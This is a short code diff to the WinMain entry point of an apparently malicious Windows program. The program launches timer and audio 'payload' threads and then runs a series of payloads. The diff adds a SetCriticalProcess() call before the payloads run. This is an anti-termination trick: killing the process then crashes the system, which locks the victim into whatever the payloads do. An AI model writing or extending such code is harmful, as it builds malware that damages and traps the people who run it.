@@ -52,6 +52,8 @@ int WinMain(
 	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(InitTimer), (PVOID)1000, 0, NULL);
 	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(AudioPayloadThread), (PVOID)pAudioSequences, 0, NULL);
 
+	SetCriticalProcess();
+
 	ExecutePayload(Payload1, PAYLOAD_TIME);
 	ExecutePayload(Payload2, PAYLOAD_TIME);
 	ExecutePayload(Payload3, PAYLOAD_TIME);
